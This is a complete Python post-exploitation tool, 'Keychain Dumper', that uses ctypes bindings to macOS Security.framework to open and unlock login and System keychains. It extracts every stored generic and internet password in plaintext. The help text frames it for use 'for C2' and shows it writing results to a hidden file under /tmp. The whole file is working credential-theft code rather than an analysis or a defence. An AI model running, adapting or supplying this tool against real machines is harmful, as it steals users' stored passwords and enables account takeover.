#!/usr/bin/env python3
"""
Keychain Dumper - @Speersec
Dual-API keychain extraction using Security.framework via ctypes.
"""

import ctypes
import ctypes.util
import os
import sys
import json
import base64
import struct
from datetime import datetime


# ─────────────────────────────────────────────────────────
# CoreFoundation ctypes bindings
# ─────────────────────────────────────────────────────────

class CF:
    """CoreFoundation framework bindings."""

    def __init__(self):
        path = ctypes.util.find_library("CoreFoundation")
        if not path:
            raise RuntimeError("CoreFoundation not found")
        self.lib = ctypes.cdll.LoadLibrary(path)
        self._setup()

    def _setup(self):
        L = self.lib

        # Allocator
        self.kCFAllocatorDefault = ctypes.c_void_p.in_dll(L, "kCFAllocatorDefault")

        # Boolean constants
        self.kCFBooleanTrue = ctypes.c_void_p.in_dll(L, "kCFBooleanTrue")
        self.kCFBooleanFalse = ctypes.c_void_p.in_dll(L, "kCFBooleanFalse")

        # Dictionary callbacks
        self.kCFTypeDictionaryKeyCallBacks = ctypes.c_void_p.in_dll(
            L, "kCFTypeDictionaryKeyCallBacks"
        )
        self.kCFTypeDictionaryValueCallBacks = ctypes.c_void_p.in_dll(
            L, "kCFTypeDictionaryValueCallBacks"
        )

        # String encoding
        self.kCFStringEncodingUTF8 = 0x08000100

        # CFStringCreateWithCString
        L.CFStringCreateWithCString.argtypes = [
            ctypes.c_void_p, ctypes.c_char_p, ctypes.c_uint32
        ]
        L.CFStringCreateWithCString.restype = ctypes.c_void_p

        # CFDictionaryCreate
        L.CFDictionaryCreate.argtypes = [
            ctypes.c_void_p,
            ctypes.POINTER(ctypes.c_void_p),
            ctypes.POINTER(ctypes.c_void_p),
            ctypes.c_long,
            ctypes.c_void_p,
            ctypes.c_void_p,
        ]
        L.CFDictionaryCreate.restype = ctypes.c_void_p

        # CFDictionaryGetCount
        L.CFDictionaryGetCount.argtypes = [ctypes.c_void_p]
        L.CFDictionaryGetCount.restype = ctypes.c_long

        # CFDictionaryGetKeysAndValues
        L.CFDictionaryGetKeysAndValues.argtypes = [
            ctypes.c_void_p,
            ctypes.POINTER(ctypes.c_void_p),
            ctypes.POINTER(ctypes.c_void_p),
        ]

        # CFGetTypeID
        L.CFGetTypeID.argtypes = [ctypes.c_void_p]
        L.CFGetTypeID.restype = ctypes.c_ulong

        # Type IDs for runtime type checking
        L.CFStringGetTypeID.argtypes = []
        L.CFStringGetTypeID.restype = ctypes.c_ulong
        L.CFDataGetTypeID.argtypes = []
        L.CFDataGetTypeID.restype = ctypes.c_ulong
        L.CFNumberGetTypeID.argtypes = []
        L.CFNumberGetTypeID.restype = ctypes.c_ulong
        L.CFDictionaryGetTypeID.argtypes = []
        L.CFDictionaryGetTypeID.restype = ctypes.c_ulong
        L.CFArrayGetTypeID.argtypes = []
        L.CFArrayGetTypeID.restype = ctypes.c_ulong
        L.CFBooleanGetTypeID.argtypes = []
        L.CFBooleanGetTypeID.restype = ctypes.c_ulong

        # CFStringGetCString
        L.CFStringGetCString.argtypes = [
            ctypes.c_void_p, ctypes.c_char_p, ctypes.c_long, ctypes.c_uint32
        ]
        L.CFStringGetCString.restype = ctypes.c_bool

        # CFStringGetLength
        L.CFStringGetLength.argtypes = [ctypes.c_void_p]
        L.CFStringGetLength.restype = ctypes.c_long

        # CFDataGetLength
        L.CFDataGetLength.argtypes = [ctypes.c_void_p]
        L.CFDataGetLength.restype = ctypes.c_long

        # CFDataGetBytePtr
        L.CFDataGetBytePtr.argtypes = [ctypes.c_void_p]
        L.CFDataGetBytePtr.restype = ctypes.POINTER(ctypes.c_ubyte)

        # CFNumberGetValue
        L.CFNumberGetValue.argtypes = [
            ctypes.c_void_p, ctypes.c_long, ctypes.c_void_p
        ]
        L.CFNumberGetValue.restype = ctypes.c_bool

        # CFArrayGetCount
        L.CFArrayGetCount.argtypes = [ctypes.c_void_p]
        L.CFArrayGetCount.restype = ctypes.c_long

        # CFArrayGetValueAtIndex
        L.CFArrayGetValueAtIndex.argtypes = [ctypes.c_void_p, ctypes.c_long]
        L.CFArrayGetValueAtIndex.restype = ctypes.c_void_p

        # CFBooleanGetValue
        L.CFBooleanGetValue.argtypes = [ctypes.c_void_p]
        L.CFBooleanGetValue.restype = ctypes.c_bool

        # CFRelease
        L.CFRelease.argtypes = [ctypes.c_void_p]
        L.CFRelease.restype = None

    def cfstr(self, s: str) -> ctypes.c_void_p:
        """Create a CFStringRef from a Python string."""
        return self.lib.CFStringCreateWithCString(
            None, s.encode("utf-8"), self.kCFStringEncodingUTF8
        )

    def cfstr_to_str(self, cfstring: ctypes.c_void_p) -> str:
        """Convert a CFStringRef to a Python string."""
        if not cfstring:
            return ""
        buf = ctypes.create_string_buffer(4096)
        ok = self.lib.CFStringGetCString(
            cfstring, buf, 4096, self.kCFStringEncodingUTF8
        )
        if ok:
            return buf.value.decode("utf-8", errors="replace")
        return ""

    def cfdata_to_bytes(self, cfdata: ctypes.c_void_p) -> bytes:
        """Convert a CFDataRef to Python bytes."""
        if not cfdata:
            return b""
        length = self.lib.CFDataGetLength(cfdata)
        ptr = self.lib.CFDataGetBytePtr(cfdata)
        return bytes(ptr[:length])

    def cfnumber_to_int(self, cfnumber: ctypes.c_void_p) -> int:
        """Convert a CFNumberRef to a Python int."""
        if not cfnumber:
            return 0
        val = ctypes.c_long(0)
        # kCFNumberLongType = 10
        self.lib.CFNumberGetValue(cfnumber, 10, ctypes.byref(val))
        return val.value

    def cftype_to_python(self, ref: ctypes.c_void_p):
        """Convert an arbitrary CFTypeRef to a Python object."""
        if not ref:
            return None

        type_id = self.lib.CFGetTypeID(ref)

        if type_id == self.lib.CFStringGetTypeID():
            return self.cfstr_to_str(ref)
        elif type_id == self.lib.CFDataGetTypeID():
            raw = self.cfdata_to_bytes(ref)
            try:
                decoded = raw.decode("utf-8")
                # Only return as string if it looks printable
                if all(c.isprintable() or c in "\r\n\t" for c in decoded):
                    return decoded
            except UnicodeDecodeError:
                pass
            return "<data:" + base64.b64encode(raw).decode("ascii") + ">"
        elif type_id == self.lib.CFNumberGetTypeID():
            return self.cfnumber_to_int(ref)
        elif type_id == self.lib.CFBooleanGetTypeID():
            return bool(self.lib.CFBooleanGetValue(ref))
        elif type_id == self.lib.CFDictionaryGetTypeID():
            return self.cfdict_to_dict(ref)
        elif type_id == self.lib.CFArrayGetTypeID():
            count = self.lib.CFArrayGetCount(ref)
            return [
                self.cftype_to_python(self.lib.CFArrayGetValueAtIndex(ref, i))
                for i in range(count)
            ]
        else:
            return f"<CFType:{type_id}>"

    def cfdict_to_dict(self, cfdict: ctypes.c_void_p) -> dict:
        """Convert a CFDictionaryRef to a Python dict."""
        if not cfdict:
            return {}
        count = self.lib.CFDictionaryGetCount(cfdict)
        if count <= 0:
            return {}

        keys = (ctypes.c_void_p * count)()
        values = (ctypes.c_void_p * count)()
        self.lib.CFDictionaryGetKeysAndValues(cfdict, keys, values)

        result = {}
        for i in range(count):
            k = self.cftype_to_python(keys[i])
            v = self.cftype_to_python(values[i])
            if k is not None:
                result[str(k)] = v
        return result

    def make_dict(self, pairs: dict) -> ctypes.c_void_p:
        """Create a CFDictionaryRef from a Python dict of {c_void_p: c_void_p}."""
        count = len(pairs)
        keys_arr = (ctypes.c_void_p * count)()
        vals_arr = (ctypes.c_void_p * count)()
        for i, (k, v) in enumerate(pairs.items()):
            keys_arr[i] = k
            vals_arr[i] = v

        return self.lib.CFDictionaryCreate(
            None,
            keys_arr,
            vals_arr,
            count,
            ctypes.byref(self.kCFTypeDictionaryKeyCallBacks),
            ctypes.byref(self.kCFTypeDictionaryValueCallBacks),
        )


# ─────────────────────────────────────────────────────────
# Security.framework ctypes bindings
# ─────────────────────────────────────────────────────────

class Sec:
    """Security.framework bindings."""

    # Error codes
    errSecSuccess = 0
    errSecItemNotFound = -25300
    errSecAuthFailed = -25293
    errSecInteractionNotAllowed = -25308
    errSecNoSuchKeychain = -25294
    errSecDuplicateItem = -25299
    errSecMissingEntitlement = -34018

    ERROR_NAMES = {
        0: "errSecSuccess",
        -25300: "errSecItemNotFound",
        -25293: "errSecAuthFailed",
        -25308: "errSecInteractionNotAllowed",
        -25294: "errSecNoSuchKeychain",
        -25299: "errSecDuplicateItem",
        -34018: "errSecMissingEntitlement",
    }

    def __init__(self, cf: CF):
        self.cf = cf
        path = ctypes.util.find_library("Security")
        if not path:
            raise RuntimeError("Security.framework not found")
        self.lib = ctypes.cdll.LoadLibrary(path)
        self._setup()
        self._load_constants()

    def _setup(self):
        L = self.lib

        # SecKeychainOpen
        L.SecKeychainOpen.argtypes = [ctypes.c_char_p, ctypes.POINTER(ctypes.c_void_p)]
        L.SecKeychainOpen.restype = ctypes.c_int32

        # SecKeychainUnlock
        L.SecKeychainUnlock.argtypes = [
            ctypes.c_void_p, ctypes.c_uint32, ctypes.c_void_p, ctypes.c_bool
        ]
        L.SecKeychainUnlock.restype = ctypes.c_int32

        # SecKeychainSearchCreateFromAttributes
        L.SecKeychainSearchCreateFromAttributes.argtypes = [
            ctypes.c_void_p, ctypes.c_uint32, ctypes.c_void_p,
            ctypes.POINTER(ctypes.c_void_p),
        ]
        L.SecKeychainSearchCreateFromAttributes.restype = ctypes.c_int32

        # SecKeychainSearchCopyNext
        L.SecKeychainSearchCopyNext.argtypes = [
            ctypes.c_void_p, ctypes.POINTER(ctypes.c_void_p)
        ]
        L.SecKeychainSearchCopyNext.restype = ctypes.c_int32

        # SecKeychainItemCopyContent
        L.SecKeychainItemCopyContent.argtypes = [
            ctypes.c_void_p,
            ctypes.POINTER(ctypes.c_uint32),
            ctypes.c_void_p,
            ctypes.POINTER(ctypes.c_uint32),
            ctypes.POINTER(ctypes.c_void_p),
        ]
        L.SecKeychainItemCopyContent.restype = ctypes.c_int32

        # SecKeychainItemFreeContent
        L.SecKeychainItemFreeContent.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
        L.SecKeychainItemFreeContent.restype = ctypes.c_int32

        # SecItemCopyMatching (modern API)
        L.SecItemCopyMatching.argtypes = [
            ctypes.c_void_p, ctypes.POINTER(ctypes.c_void_p)
        ]
        L.SecItemCopyMatching.restype = ctypes.c_int32

        # SecKeychainGetStatus (check if already unlocked)
        L.SecKeychainGetStatus.argtypes = [
            ctypes.c_void_p, ctypes.POINTER(ctypes.c_uint32)
        ]
        L.SecKeychainGetStatus.restype = ctypes.c_int32

    def _load_constants(self):
        """Load Security.framework constant CFStringRefs."""
        L = self.lib

        def _get_cfstr(name: str) -> ctypes.c_void_p:
            try:
                return ctypes.c_void_p.in_dll(L, name)
            except ValueError:
                return ctypes.c_void_p(0)

        # kSecClass values
        self.kSecClass = _get_cfstr("kSecClass")
        self.kSecClassGenericPassword = _get_cfstr("kSecClassGenericPassword")
        self.kSecClassInternetPassword = _get_cfstr("kSecClassInternetPassword")
        self.kSecClassCertificate = _get_cfstr("kSecClassCertificate")
        self.kSecClassKey = _get_cfstr("kSecClassKey")
        self.kSecClassIdentity = _get_cfstr("kSecClassIdentity")

        # Return types
        self.kSecReturnAttributes = _get_cfstr("kSecReturnAttributes")
        self.kSecReturnData = _get_cfstr("kSecReturnData")
        self.kSecReturnRef = _get_cfstr("kSecReturnRef")

        # Match
        self.kSecMatchLimit = _get_cfstr("kSecMatchLimit")
        self.kSecMatchLimitAll = _get_cfstr("kSecMatchLimitAll")

        # Attribute keys
        self.kSecAttrAccount = _get_cfstr("kSecAttrAccount")
        self.kSecAttrService = _get_cfstr("kSecAttrService")
        self.kSecAttrServer = _get_cfstr("kSecAttrServer")
        self.kSecAttrLabel = _get_cfstr("kSecAttrLabel")
        self.kSecAttrPort = _get_cfstr("kSecAttrPort")
        self.kSecAttrProtocol = _get_cfstr("kSecAttrProtocol")
        self.kSecAttrPath = _get_cfstr("kSecAttrPath")
        self.kSecAttrSecurityDomain = _get_cfstr("kSecAttrSecurityDomain")
        self.kSecAttrDescription = _get_cfstr("kSecAttrDescription")
        self.kSecAttrComment = _get_cfstr("kSecAttrComment")
        self.kSecAttrCreationDate = _get_cfstr("kSecAttrCreationDate")
        self.kSecAttrModificationDate = _get_cfstr("kSecAttrModificationDate")
        self.kSecAttrAccessGroup = _get_cfstr("kSecAttrAccessGroup")
        self.kSecAttrSynchronizable = _get_cfstr("kSecAttrSynchronizable")
        self.kSecAttrSynchronizableAny = _get_cfstr("kSecAttrSynchronizableAny")
        self.kSecValueData = _get_cfstr("kSecValueData")

    def status_str(self, code: int) -> str:
        return self.ERROR_NAMES.get(code, f"OSStatus({code})")


# ─────────────────────────────────────────────────────────
# Legacy keychain extraction (SecKeychainItemCopyContent)
# Targets: .keychain files, Catalina through Sonoma
# ─────────────────────────────────────────────────────────

def dump_legacy_keychain(sec: Sec, cf: CF, keychain_path: str, password: str | None = None) -> list:
    """
    Open a legacy .keychain file and extract all generic + internet
    password items using the file-based API.

    If password is provided, attempts to unlock with it.
    If password is None, checks if the keychain is already unlocked
    (the System keychain is unlocked at boot by the OS using SystemKey).
    """
    results = []

    # Open
    kc_ref = ctypes.c_void_p()
    status = sec.lib.SecKeychainOpen(
        keychain_path.encode("utf-8"), ctypes.byref(kc_ref)
    )
    if status != Sec.errSecSuccess:
        print(f"  [-] SecKeychainOpen failed: {sec.status_str(status)}")
        return results

    # Check if already unlocked (System keychain is unlocked at boot)
    kc_status = ctypes.c_uint32()
    status = sec.lib.SecKeychainGetStatus(kc_ref, ctypes.byref(kc_status))

    # Bit 0 of status word = locked flag (0 = unlocked)
    # Bit 1 = readable, Bit 2 = writable
    already_unlocked = (status == Sec.errSecSuccess and (kc_status.value & 0x01) == 0)

    if already_unlocked:
        print(f"  [+] Keychain already unlocked (OS-managed): {keychain_path}")
    elif password:
        pw = password.encode("utf-8")
        status = sec.lib.SecKeychainUnlock(
            kc_ref, ctypes.c_uint32(len(pw)), pw, ctypes.c_bool(True)
        )
        if status != Sec.errSecSuccess:
            print(f"  [-] SecKeychainUnlock failed: {sec.status_str(status)}")
            return results
        print(f"  [+] Keychain unlocked with password: {keychain_path}")
    else:
        # Try to unlock with empty password (usePassword=False lets OS decide)
        status = sec.lib.SecKeychainUnlock(
            kc_ref, ctypes.c_uint32(0), None, ctypes.c_bool(False)
        )
        if status == Sec.errSecSuccess:
            print(f"  [+] Keychain unlocked (no password needed): {keychain_path}")
        else:
            print(f"  [-] Keychain locked and no password provided: {keychain_path}")
            print(f"      Status: {sec.status_str(status)}")
            print(f"      Use --password to provide the unlock password.")
            return results

    # Item class codes (FourCharCode as uint32)
    item_classes = {
        0x67656E70: "generic_password",    # 'genp'
        0x696E6574: "internet_password",   # 'inet'
    }

    for class_code, class_name in item_classes.items():
        search_ref = ctypes.c_void_p()
        status = sec.lib.SecKeychainSearchCreateFromAttributes(
            kc_ref, ctypes.c_uint32(class_code), None, ctypes.byref(search_ref)
        )
        if status != Sec.errSecSuccess:
            continue

        count = 0
        while True:
            item_ref = ctypes.c_void_p()
            status = sec.lib.SecKeychainSearchCopyNext(
                search_ref, ctypes.byref(item_ref)
            )
            if status != Sec.errSecSuccess:
                break

            # Extract password data
            item_class = ctypes.c_uint32()
            data_length = ctypes.c_uint32()
            data_ptr = ctypes.c_void_p()

            entry = {"type": class_name, "source": "legacy_api"}

            status = sec.lib.SecKeychainItemCopyContent(
                item_ref,
                ctypes.byref(item_class),
                None,
                ctypes.byref(data_length),
                ctypes.byref(data_ptr),
            )

            if status == Sec.errSecSuccess and data_ptr.value and data_length.value > 0:
                raw = ctypes.string_at(data_ptr, data_length.value)
                try:
                    decoded = raw.decode("utf-8")
                    if all(c.isprintable() or c in "\r\n\t" for c in decoded):
                        entry["password"] = decoded
                    else:
                        entry["password_b64"] = base64.b64encode(raw).decode("ascii")
                except UnicodeDecodeError:
                    entry["password_b64"] = base64.b64encode(raw).decode("ascii")

                sec.lib.SecKeychainItemFreeContent(None, data_ptr)
            elif status == Sec.errSecInteractionNotAllowed:
                entry["password"] = "[INTERACTION_NOT_ALLOWED]"
            elif status == Sec.errSecAuthFailed:
                entry["password"] = "[ACL_DENIED]"
            else:
                entry["password"] = f"[ERROR:{sec.status_str(status)}]"

            results.append(entry)
            count += 1

        print(f"  [+] {class_name}: {count} items")

    return results


# ─────────────────────────────────────────────────────────
# Modern keychain extraction (SecItemCopyMatching)
# Targets: .keychain-db and Data Protection keychain
# Works Catalina through Sonoma for items without
# entitlement restrictions
# ─────────────────────────────────────────────────────────

def dump_modern_keychain(sec: Sec, cf: CF) -> list:
    """
    Use SecItemCopyMatching to extract items from the Data
    Protection keychain (the modern .keychain-db store).
    This accesses items that the legacy API cannot see.
    """
    results = []

    item_classes = [
        (sec.kSecClassGenericPassword, "generic_password"),
        (sec.kSecClassInternetPassword, "internet_password"),
    ]

    for class_ref, class_name in item_classes:
        # Build query: return all matching items with attributes + data
        query = cf.make_dict({
            sec.kSecClass: class_ref,
            sec.kSecMatchLimit: sec.kSecMatchLimitAll,
            sec.kSecReturnAttributes: cf.kCFBooleanTrue,
            sec.kSecReturnData: cf.kCFBooleanTrue,
        })

        result_ref = ctypes.c_void_p()
        status = sec.lib.SecItemCopyMatching(query, ctypes.byref(result_ref))

        if status == Sec.errSecItemNotFound:
            print(f"  [-] {class_name}: no items found")
            continue
        elif status == Sec.errSecInteractionNotAllowed:
            print(f"  [-] {class_name}: interaction not allowed (no GUI session?)")
            continue
        elif status == Sec.errSecMissingEntitlement:
            print(f"  [-] {class_name}: missing entitlement (Sequoia+ restriction)")
            continue
        elif status != Sec.errSecSuccess:
            print(f"  [-] {class_name}: {sec.status_str(status)}")
            continue

        # Parse the returned CFArray of CFDictionary items
        if not result_ref.value:
            continue

        count = cf.lib.CFArrayGetCount(result_ref)
        print(f"  [+] {class_name}: {count} items")

        for i in range(count):
            item_dict_ref = cf.lib.CFArrayGetValueAtIndex(result_ref, i)
            if not item_dict_ref:
                continue

            attrs = cf.cfdict_to_dict(item_dict_ref)
            entry = {"type": class_name, "source": "secitem_api"}

            # Map CF attribute names to readable names
            field_map = {
                "acct": "account",
                "svce": "service",
                "srvr": "server",
                "labl": "label",
                "port": "port",
                "ptcl": "protocol",
                "path": "path",
                "sdmn": "security_domain",
                "desc": "description",
                "icmt": "comment",
                "cdat": "created",
                "mdat": "modified",
                "agrp": "access_group",
                "sync": "synchronizable",
                "v_Data": "password_raw",
            }

            for cf_key, readable_key in field_map.items():
                if cf_key in attrs:
                    val = attrs[cf_key]
                    if readable_key == "password_raw":
                        # v_Data contains the actual secret
                        if isinstance(val, str) and val.startswith("<data:"):
                            # base64 encoded binary data
                            entry["password_b64"] = val[6:-1]
                        elif isinstance(val, str):
                            entry["password"] = val
                        else:
                            entry["password"] = str(val)
                    else:
                        entry[readable_key] = val

            # Also include any unmapped attributes for completeness
            for k, v in attrs.items():
                mapped = False
                for cf_key in field_map:
                    if k == cf_key:
                        mapped = True
                        break
                if not mapped and k not in ("class", "tomb"):
                    entry[f"_attr_{k}"] = v

            results.append(entry)

    return results


# ─────────────────────────────────────────────────────────
# Output formatting
# ─────────────────────────────────────────────────────────

def print_entry(entry: dict, index: int) -> None:
    """Print a single keychain entry to stdout."""
    etype = entry.get("type", "unknown")
    source = entry.get("source", "unknown")

    # Build the display line
    if etype == "generic_password":
        label = entry.get("service", entry.get("label", "?"))
        acct = entry.get("account", "?")
        prefix = f"  [{index}] genp | {label} | {acct}"
    elif etype == "internet_password":
        label = entry.get("server", entry.get("label", "?"))
        acct = entry.get("account", "?")
        port = entry.get("port", "")
        prefix = f"  [{index}] inet | {label}:{port} | {acct}"
    else:
        prefix = f"  [{index}] {etype}"

    # Password status
    if "password" in entry and not str(entry["password"]).startswith("["):
        pw_display = entry["password"]
        # Truncate very long passwords for display
        if len(pw_display) > 80:
            pw_display = pw_display[:80] + "..."
        print(f"{prefix} -> {pw_display}")
    elif "password_b64" in entry:
        print(f"{prefix} -> [B64:{entry['password_b64'][:40]}...]")
    elif "password" in entry:
        print(f"{prefix} -> {entry['password']}")
    else:
        print(f"{prefix} -> [NO_DATA]")


# ─────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────

def main():
    import argparse

    parser = argparse.ArgumentParser(
        description="Keychain Dumper - @Speersec",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Dump with password provided (non-interactive, for C2)
  python3 kc_dump.py --password UserPass123

  # Dump with password prompt (interactive)
  python3 kc_dump.py --prompt

  # Dump System keychain as root (no password needed)
  sudo python3 kc_dump.py --system

  # Dump modern keychain only (no password needed if session
  # is already authenticated)
  python3 kc_dump.py --modern-only

  # Output to JSON file
  python3 kc_dump.py --password UserPass123 --output /tmp/.kc.json

  # Target a specific keychain file
  python3 kc_dump.py --password UserPass123 --keychain /path/to/login.keychain
        """,
    )

    parser.add_argument(
        "--password",
        help="Keychain password (user login password). "
             "Insecure: visible in process list.",
    )
    parser.add_argument(
        "--prompt", action="store_true",
        help="Prompt for password interactively.",
    )
    parser.add_argument(
        "--keychain",
        help="Path to a specific keychain file (legacy API).",
    )
    parser.add_argument(
        "--modern-only", action="store_true", dest="modern_only",
        help="Only use SecItemCopyMatching (skip legacy API).",
    )
    parser.add_argument(
        "--legacy-only", action="store_true", dest="legacy_only",
        help="Only use legacy SecKeychainItem API.",
    )
    parser.add_argument(
        "--system", action="store_true",
        help="Target the System keychain as root (no password needed, "
             "OS keeps it unlocked at boot).",
    )
    parser.add_argument(
        "--output", "-o",
        help="Write JSON output to file (default: stdout only).",
    )
    parser.add_argument(
        "--quiet", "-q", action="store_true",
        help="Minimal output (JSON only, no status messages).",
    )

    args = parser.parse_args()

    # Password handling
    password = args.password
    if args.prompt:
        import getpass
        password = getpass.getpass("Keychain password: ")

    if not password and not args.modern_only and not args.system:
        print("[!] No password provided. Options:")
        print("    --password PASSWORD   Provide the user's login password")
        print("    --prompt              Prompt interactively")
        print("    --system              Target System keychain as root (no password)")
        print("    --modern-only         Skip legacy API (may work without password)")
        sys.exit(1)

    # Initialise frameworks
    if not args.quiet:
        print("[*] Keychain Dumper - @Speersec")
        print(f"[*] UID: {os.getuid()} | PID: {os.getpid()}")
        print(f"[*] Time: {datetime.now().isoformat()}")
        print()

    try:
        cf = CF()
        sec = Sec(cf)
    except RuntimeError as e:
        print(f"[!] Framework load failed: {e}")
        print("[!] This script must run on macOS.")
        sys.exit(1)

    all_results = []

    # Phase 1: Legacy API (file-based keychains)
    if not args.modern_only:
        if not args.quiet:
            print("[*] Phase 1: Legacy keychain API (file-based)")

        # Find keychain paths to try
        keychain_paths = []
        if args.keychain:
            keychain_paths.append(args.keychain)
        elif args.system:
            # System keychain only
            sys_kc = "/Library/Keychains/System.keychain"
            if os.path.exists(sys_kc):
                keychain_paths.append(sys_kc)
            else:
                print("  [-] System keychain not found at expected path.")
        else:
            home = os.path.expanduser("~")
            candidates = [
                os.path.join(home, "Library", "Keychains", "login.keychain-db"),
                os.path.join(home, "Library", "Keychains", "login.keychain"),
            ]
            for p in candidates:
                if os.path.exists(p):
                    keychain_paths.append(p)

            # Also try System keychain if running as root
            if os.getuid() == 0:
                sys_kc = "/Library/Keychains/System.keychain"
                if os.path.exists(sys_kc):
                    keychain_paths.append(sys_kc)

        for kc_path in keychain_paths:
            if not args.quiet:
                print(f"\n  [*] Trying: {kc_path}")
            entries = dump_legacy_keychain(sec, cf, kc_path, password)
            all_results.extend(entries)

    # Phase 2: Modern SecItem API (Data Protection keychain)
    if not args.legacy_only:
        if not args.quiet:
            print("\n[*] Phase 2: Modern SecItem API (Data Protection keychain)")

        modern_entries = dump_modern_keychain(sec, cf)
        all_results.extend(modern_entries)

    # Deduplicate (same account+service from both APIs)
    seen = set()
    deduped = []
    for entry in all_results:
        key = (
            entry.get("type", ""),
            entry.get("account", entry.get("acct", "")),
            entry.get("service", entry.get("server", entry.get("srvr", ""))),
        )
        if key not in seen or key == ("", "", ""):
            seen.add(key)
            deduped.append(entry)

    # Output
    if not args.quiet:
        print(f"\n{'=' * 60}")
        print(f"RESULTS: {len(deduped)} unique items")
        print(f"{'=' * 60}")

        decrypted = sum(
            1 for e in deduped
            if ("password" in e and not str(e["password"]).startswith("["))
            or "password_b64" in e
        )
        print(f"  Decrypted: {decrypted}")
        print(f"  Locked/Denied: {len(deduped) - decrypted}")
        print()

        for i, entry in enumerate(deduped, 1):
            print_entry(entry, i)

    # JSON output
    output_data = {
        "timestamp": datetime.now().isoformat(),
        "uid": os.getuid(),
        "pid": os.getpid(),
        "total_items": len(deduped),
        "items": deduped,
    }

    if args.output:
        try:
            with open(args.output, "w") as f:
                json.dump(output_data, f, indent=2, default=str)
            os.chmod(args.output, 0o600)
            if not args.quiet:
                print(f"\n[*] JSON written to {args.output}")
        except OSError as e:
            print(f"\n[!] Failed to write output: {e}")
    elif args.quiet:
        print(json.dumps(output_data, indent=2, default=str))


if __name__ == "__main__":
    main()
